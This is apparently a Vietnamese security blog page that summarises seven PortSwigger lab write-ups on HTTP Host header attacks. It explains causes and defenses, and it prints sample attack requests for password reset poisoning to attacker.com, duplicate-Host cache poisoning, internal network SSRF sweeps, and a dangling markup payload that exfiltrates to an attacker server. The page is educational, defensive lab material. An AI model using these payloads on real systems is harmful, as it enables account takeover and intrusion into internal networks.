---
title: "[PortSwigger] HTTP Host Header Attacks Series"
date: 2026-09-14
description: "Tổng hợp phân tích toàn diện chuỗi 7 bài lab về lỗ hổng HTTP Host Header trên PortSwigger Web Security Academy: nguyên nhân cốt lõi, kỹ thuật khai thác chuyên sâu và giải pháp phòng vệ theo chiều sâu."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
showAuthor: false
showTableOfContents: true
---

Chào mừng bạn đến với chuyên đề **HTTP Host Header Attacks** thuộc chuỗi bài giải lab **PortSwigger Web Security Academy**. 

Trường tiêu đề `Host` là một thành phần bắt buộc trong giao thức HTTP/1.1 và HTTP/2, được thiết kế nhằm phục vụ cơ chế Virtual Hosting cho phép nhiều trang web cùng vận hành trên một địa chỉ IP duy nhất. Tuy nhiên, do giá trị này hoàn toàn nằm dưới sự kiểm soát của máy khách, việc thiếu xác thực chặt chẽ tại các tầng trung gian hoặc sự tin tưởng ngầm định ở tầng mã nguồn ứng dụng sẽ dẫn đến những kịch bản tấn công nguy hiểm như: **Password Reset Poisoning, Web Cache Poisoning, Routing-based SSRF, Authentication Bypass và Dangling Markup Injection**.

---

## Danh sách 7 bài Lab trong Series

| Lab | Tên bài Lab | Mức độ | Kỹ thuật khai thác chính |
| :---: | :--- | :---: | :--- |
| **01** | [Basic password reset poisoning](lab-01-basic-password-reset-poisoning/) | Apprentice | Đầu độc header `Host` trong yêu cầu quên mật khẩu |
| **02** | [Host header authentication bypass](lab-02-host-header-authentication-bypass/) | Apprentice | Giả mạo Host truy cập trái phép trang quản trị nội bộ |
| **03** | [Web cache poisoning via ambiguous requests](lab-03-web-cache-poisoning-via-ambiguous-requests/) | Practitioner | Kỹ thuật Duplicate Host Header đầu độc Web Cache |
| **04** | [Routing-based SSRF](lab-04-routing-based-ssrf/) | Practitioner | Tận dụng reverse proxy định tuyến sai để quét và truy cập mạng nội bộ |
| **05** | [SSRF via flawed request parsing](lab-05-ssrf-via-flawed-request-parsing/) | Practitioner | Bất đồng bộ phân tích URL giữa reverse proxy và backend server |
| **06** | [Host validation bypass via connection state attack](lab-06-host-validation-bypass-via-connection-state-attack/) | Practitioner | Khai thác cơ chế HTTP persistent connection để bypass kiểm tra Host |
| **07** | [Password reset poisoning via dangling markup](lab-07-password-reset-poisoning-via-dangling-markup/) | Expert | Trích xuất token reset qua dangling markup injection khi không có tương tác người dùng |

---

## Cấu trúc phân tích chuẩn cho mỗi bài viết
Mỗi bài giải trong series được chuẩn hóa theo cấu trúc 4 phần:
1. **Kiến thức nền tảng**: Cơ chế hoạt động của giao thức, thành phần hệ thống liên quan và bối cảnh bài toán.
2. **Mô hình tấn công**: Sơ đồ luồng dữ liệu và nguyên nhân phát sinh lỗ hổng bảo mật.
3. **Khai thác lỗ hổng**: Chi tiết các bước thực nghiệm, phân tích request/response qua Burp Suite và xây dựng PoC.
4. **Biện pháp khắc phục**: Hướng dẫn vá lỗi, cấu hình an toàn cho tầng Web Server / Reverse Proxy và tầng ứng dụng.

---

## Tổng hợp nguyên nhân dẫn đến lỗ hổng

Dựa trên toàn bộ 7 bài lab thực nghiệm, lỗ hổng liên quan đến trường tiêu đề `Host` phát sinh từ 6 nguyên nhân kiến trúc và triển khai cốt lõi sau:

### 1. Tin tưởng ngầm định vào dữ liệu do người dùng kiểm soát
Nhiều framework và lập trình viên thường mặc định rằng tiêu đề `Host` đại diện cho tên miền chính thức của trang web. Thay vì cấu hình một biến môi trường tĩnh (như `APP_URL`), ứng dụng lại đọc trực tiếp giá trị từ `Host` header để tạo các đường dẫn điều hướng, URL trong email đặt lại mật khẩu hoặc liên kết nhúng tài nguyên tĩnh (như trong Lab 1 và Lab 3).

### 2. Sự bất đồng bộ trong phân tích cú pháp giữa các tầng kiến trúc
Trong các hệ thống phân tán đa tầng, các bộ phân tích cú pháp HTTP (HTTP Parsers) thường được phát triển bởi các bên khác nhau, dẫn đến hiện tượng hiểu sai lệch cùng một thông điệp:
- **Xung đột Request Target**: Front-end proxy kiểm tra tính hợp lệ dựa trên dòng Request Line chứa URL tuyệt đối (`GET https://target.com/ HTTP/2`), trong khi Backend router lại đọc trường `Host` để chuyển tiếp gói tin (Lab 5).
- **Phân giải mơ hồ khi trùng lặp tiêu đề (Duplicate Headers)**: Hệ thống Web Cache phân giải và lấy giá trị của header `Host` đầu tiên để tạo khóa lưu trữ (Cache Key), trong khi Backend framework lại lấy giá trị của header `Host` thứ hai để sinh nội dung HTML (Lab 3).

### 3. Định tuyến động dựa trên giá trị chuỗi không kiểm duyệt
Reverse Proxy hoặc Load Balancer được thiết lập ở chế độ chuyển tiếp gói tin trực tiếp vào mạng nội bộ dựa trên giá trị chuỗi của `Host` header mà không áp dụng danh sách trắng tên miền hoặc dải IP được phép. Khi nhận giá trị là một địa chỉ IP riêng, proxy sẽ tự động tạo kết nối TCP đến chính IP đó trong mạng LAN, biến thành bàn đạp cho tấn công SSRF (Lab 4).

### 4. Sai lầm phụ thuộc trạng thái kết nối
Để tăng tốc độ truyền tải, HTTP/1.1 và HTTP/2 duy trì các kết nối liên tục (Persistent Connection / Keep-Alive). Tuy nhiên, một số hệ thống phòng thủ chỉ thực hiện kiểm tra an ninh trên request đầu tiên của kết nối mạng và gắn nhãn toàn bộ socket TCP là an toàn. Mọi request thứ cấp được gửi tiếp theo trên cùng kết nối mạng đó sẽ được chuyển thẳng đến máy chủ đích mà không hề qua xác thực lại (Lab 6).

### 5. Kiểm tra lỏng lẻo định dạng cổng mạng
Tiêu chuẩn RFC 7230 định nghĩa Host header có cú pháp `host[:port]`. Khi triển khai bộ lọc, nhiều Reverse Proxy chỉ tách chuỗi theo dấu hai chấm và kiểm tra phần hostname xem có thuộc danh sách hợp lệ hay không, đồng thời mặc định coi toàn bộ chuỗi phía sau dấu hai chấm là chỉ số cổng mà không xác thực kiểu dữ liệu số nguyên. Lỗi này cho phép kẻ tấn công chèn các ký tự đặc biệt của cú pháp HTML trực tiếp sau dấu hai chấm (Lab 7).

### 6. Phản xạ dữ liệu vào ngữ cảnh nhạy cảm mà không mã hóa
Ứng dụng backend lấy nguyên vẹn chuỗi tiêu đề `Host` từ môi trường để ghép chuỗi vào các mẫu email hoặc mã HTML mà không thực hiện mã hóa thực thể HTML (HTML Entity Encoding). Lỗi này trực tiếp dẫn đến các cuộc tấn công nhúng mã độc hoặc trích xuất dữ liệu nhạy cảm (Lab 7).

---

## Các kỹ thuật khai thác chuyên sâu

Quá trình pentest và khai thác lỗ hổng HTTP Host Header đòi hỏi sự kết hợp linh hoạt của nhiều kỹ năng tương ứng với từng tình huống phòng thủ của mục tiêu:

```text
                               Các kỹ thuật khai thác Host Header
                                               │
         ┌────────────────────────┬────────────┴───────────┬────────────────────────┐
         ▼                        ▼                        ▼                        ▼
 Đặt lại mật khẩu          Web Cache Poisoning       Routing-based SSRF      Bypass kiểm duyệt
 (Password Reset)          (Đầu độc bộ nhớ đệm)      (Xâm nhập mạng LAN)     (Vượt qua bộ lọc)
   - Direct Injection        - Duplicate Host          - Virtual Host scan     - Absolute URL
   - Dangling Markup         - HTTP/2 Downgrade        - Intruder IP bruteforce- Connection State
```

### 1. Đầu độc Host trực tiếp để đánh cắp Token (Lab 1)
- **Kỹ năng**: Bắt chặn request quên mật khẩu trong Burp Suite Repeater, thay đổi trường `Host` thành tên miền kiểm soát bởi kẻ tấn công (`Host: attacker.com`).
- **Tác động**: Hệ thống gửi email cho nạn nhân chứa đường dẫn kích hoạt trỏ về máy chủ tấn công (`https://attacker.com/reset-password?token=XYZ`). Khi nạn nhân nhấp vào liên kết, token bí mật sẽ xuất hiện trong Access Log của kẻ tấn công, mở đường cho việc chiếm quyền tài khoản (Account Takeover).

### 2. Kỹ thuật giả mạo Host truy cập nội bộ (Lab 2)
- **Kỹ năng**: Thay thế tiêu đề `Host` thành các định danh cục bộ như `localhost`, `127.0.0.1`, `[::1]`, hoặc kết hợp các tiêu đề ghi đè IP nguồn như `X-Forwarded-For`, `X-Real-IP`.
- **Tác động**: Đánh lừa logic kiểm soát truy cập kém an toàn vốn chỉ căn cứ vào chuỗi `Host` để xác nhận quyền quản trị viên nội bộ.

### 3. Kỹ thuật Duplicate Host Headers đầu độc Web Cache (Lab 3)
- **Kỹ năng**: Lợi dụng sự bất đồng bộ trong phân tích cú pháp của tầng Cache trung gian và Backend Server bằng cách chèn hai tiêu đề `Host` trong cùng một HTTP request:
  ```http
  GET / HTTP/1.1
  Host: victim-website.com
  Host: attacker-controlled.com
  ```
- **Tác động**: Cache Key được tạo dựa trên tên miền chính thức, nhưng phản hồi trả về lại chứa mã JavaScript nhúng từ máy chủ tấn công. Mọi người dùng thông thường truy cập trang web sau đó đều sẽ tải về và thực thi mã độc XSS từ bộ nhớ đệm.

### 4. Kỹ thuật Routing-based SSRF quét mạng nội bộ (Lab 4)
- **Kỹ năng**: Đưa địa chỉ IP mạng riêng vào `Host` header kết hợp với Burp Intruder để quét vét cạn toàn bộ dải mạng LAN (`192.168.0.0/24`):
  ```http
  GET /admin HTTP/1.1
  Host: 192.168.0.§0§
  ```
- **Tác động**: Biến Reverse Proxy thành một công cụ chuyển tiếp gói tin, định vị chính xác máy chủ nội bộ không công khai ra Internet và gửi các yêu cầu nhạy cảm như xóa dữ liệu hay thay đổi cấu hình.

### 5. Khai thác Parser Differential bằng Absolute URL (Lab 5)
- **Kỹ năng**: Đưa URL tuyệt đối của mục tiêu vào dòng Request Line để qua mặt bộ lọc của Front-end Proxy, đồng thời đưa IP mạng nội bộ vào trường `Host` để điều khiển Back-end Routing:
  ```http
  GET https://vulnerable-lab.net/admin/delete HTTP/2
  Host: 192.168.0.211
  ```
- **Tác động**: Vượt qua thành công các bộ lọc WAF hoặc Reverse Proxy có cơ chế kiểm duyệt nghiêm ngặt trên `Host` header.

### 6. Tấn công trạng thái kết nối trên một kết nối duy nhất (Lab 6)
- **Kỹ năng**: Sử dụng tính năng gửi chuỗi request trên cùng một socket TCP (`Send group (single connection)` trong Burp Suite):
  - Request 1: Gửi yêu cầu thông thường với Host hợp lệ để proxy xác thực và cấp trạng thái tin cậy cho kết nối mạng.
  - Request 2: Ngay trên cùng kết nối mạng đó, gửi yêu cầu độc hại với Host nội bộ (`Host: 192.168.0.1`).
- **Tác động**: Vô hiệu hóa cơ chế phòng thủ của Proxy bằng cách khai thác tính trạng thái của phiên kết nối mạng.

### 7. Kỹ thuật Dangling Markup Injection qua cổng mạng (Lab 7)
- **Kỹ năng**: Chèn thẻ HTML mở chưa hoàn chỉnh vào vị trí chỉ số cổng sau dấu hai chấm:
  ```http
  Host: victim-lab.net:'<a href="//attacker-server/?
  ```
- **Tác động**: Khắc phục hạn chế khi nạn nhân không bao giờ nhấp vào liên kết lạ. Thẻ HTML chưa đóng sẽ nuốt toàn bộ nội dung ký tự đứng sau (bao gồm cả mật khẩu tạm thời) và gửi về máy chủ của kẻ tấn công ngay khi ứng dụng email của nạn nhân phân tích cú pháp hiển thị nội dung.

---

## Biện pháp khắc phục toàn diện

Để triệt tiêu hoàn toàn lỗ hổng liên quan đến HTTP Host Header, hệ thống cần áp dụng chiến lược phòng thủ theo chiều sâu (Defense-in-Depth) trên cả tầng hạ tầng mạng lẫn tầng mã nguồn ứng dụng:

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        CHIẾN LƯỢC PHÒNG VỆ ĐA TẦNG                     │
├───────────────────────────────────┬────────────────────────────────────┤
│   TẦNG HẠ TẦNG & REVERSE PROXY    │     TẦNG MÃ NGUỒN ỨNG DỤNG         │
├───────────────────────────────────┼────────────────────────────────────┤
│ • Danh sách trắng Host nghiêm ngặt│ • Sử dụng biến cấu hình tĩnh       │
│ • Kiểm tra kiểu số nguyên của Port│ • Mã hóa thực thể HTML             │
│ • Chuẩn hóa định dạng Request     │ • Sử dụng Token ngẫu nhiên một lần │
│ • Xác thực phi trạng thái từng gói│ • Phân đoạn mạng và mTLS nội bộ    │
│ • Chuẩn hóa Cache Key             │ • Triển khai Content Security Policy│
└───────────────────────────────────┴────────────────────────────────────┘
```

### 1. Phòng vệ tại tầng Hạ tầng mạng và Reverse Proxy
* **Áp dụng danh sách trắng tên miền nghiêm ngặt**: Cấu hình máy chủ web và reverse proxy chỉ chấp nhận các yêu cầu có trường `Host` khớp chính xác với danh sách tên miền được phép đã định nghĩa từ trước. Mọi yêu cầu có Host không xác định phải bị từ chối ngay lập tức bằng mã lỗi `400 Bad Request` hoặc `404 Not Found`.
* **Xác thực chỉ số cổng mạng chuẩn số nguyên**: Bộ phân tích cú pháp cổng mạng bắt buộc phải kiểm tra chuỗi ký tự sau dấu hai chấm là số nguyên dương hợp lệ từ 1 đến 65535, tuyệt đối không chứa ký tự đặc biệt, ký tự khoảng trắng hay ký tự định dạng HTML (`<`, `>`, `'`, `"`).
* **Chuẩn hóa Request (Request Normalization)**: Front-end Proxy trước khi chuyển tiếp gói tin vào hệ thống nội bộ phải chuyển đổi toàn bộ URL tuyệt đối (Absolute-form) về định dạng tương đối (Origin-form). Đồng thời, trích xuất tên miền từ URL tuyệt đối và ghi đè vào `Host` header để đảm bảo tính đồng nhất tuyệt đối giữa các tầng xử lý.
* **Xác thực phi trạng thái trên từng Request (Stateless Validation)**: Reverse Proxy và WAF tuyệt đối không được dựa vào trạng thái kết nối mạng TCP Keep-Alive để bỏ qua bước kiểm tra an ninh; mỗi HTTP Request riêng lẻ đi qua đường truyền đều phải được xác thực độc lập.
* **Từ chối các yêu cầu có tiêu đề trùng lặp**: Cấu hình máy chủ từ chối ngay lập tức bất kỳ yêu cầu nào chứa nhiều hơn một tiêu đề `Host` để loại trừ hoàn toàn nguy cơ phân giải mơ hồ gây đầu độc bộ nhớ đệm.
* **Chuẩn hóa khóa lưu trữ bộ nhớ đệm (Cache Key Normalization)**: Đảm bảo mọi thành phần ảnh hưởng đến phản hồi của trang web đều được tính vào Cache Key, hoặc ngăn chặn việc lưu bộ nhớ đệm đối với các trang có chứa dữ liệu nhạy cảm.

### 2. Phòng vệ tại tầng Ứng dụng và Mã nguồn
* **Sử dụng biến cấu hình tĩnh của hệ thống**: Tuyệt đối không đọc giá trị từ `Host` header hay các tiêu đề mở rộng của proxy (như `X-Forwarded-Host`) để sinh URL tuyệt đối trong mã nguồn. Cần khai báo biến cấu hình tĩnh trong file môi trường (ví dụ: `APP_URL=https://example.com` hoặc `SERVER_NAME`) và sử dụng biến này xuyên suốt ứng dụng.
* **Mã hóa thực thể HTML toàn diện (HTML Entity Encoding)**: Mọi dữ liệu có nguồn gốc từ bên ngoài trước khi đưa vào khuôn mẫu giao diện hoặc email bắt buộc phải được mã hóa thực thể HTML, chuyển đổi các ký tự điều khiển cú pháp (`<`, `>`, `'`, `"`, `&`) thành các chuỗi thực thể an toàn.
* **Thiết kế quy trình Token an toàn**: Tuyệt đối không gửi mật khẩu mới dạng bản rõ qua email. Quy trình đặt lại mật khẩu phải sử dụng mã thông báo bí mật (Reset Token) ngẫu nhiên, có độ dài đủ lớn, thời hạn hiệu lực ngắn (10-15 phút) và bị vô hiệu hóa ngay sau lần sử dụng đầu tiên hoặc khi người dùng đổi mật khẩu thành công.
* **Kiểm soát truy cập nội bộ độc lập**: Không dựa vào sự tin tưởng ngầm định rằng "kết nối từ mạng LAN là an toàn". Mọi giao diện và API quản trị nội bộ đều phải yêu cầu xác thực phiên làm việc hợp lệ (Session Token, API Key hoặc mTLS) trên từng request độc lập.
* **Thiết lập Content Security Policy chặt chẽ**: Cấu hình chính sách CSP hạn chế tối đa việc tải tài nguyên tĩnh hoặc chuyển hướng liên kết ra bên ngoài các tên miền không được phê duyệt.
